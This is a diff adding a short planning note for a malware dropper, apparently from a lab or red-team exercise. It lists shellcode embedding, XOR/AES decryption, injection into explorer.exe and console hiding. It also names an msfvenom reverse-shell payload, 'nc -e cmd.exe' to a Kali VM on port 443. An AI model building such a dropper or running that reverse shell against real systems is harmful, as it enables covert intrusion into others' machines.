@@ -1,0 +1,10 @@
+Final dropper should:
+    - Include shellcode
+    - Extract shellcode from .rsrc
+    - Decrypt shellcode (XOR and AES)
+    - Inject shellcode into some process (explorer.exe?)
+    - Get rid of console window popup
+    - Use stenography
+
+Our shellcode currently is:
+    - Msfvenom-generated code for "nc -e cmd.exe [KALI VM IP] 443"
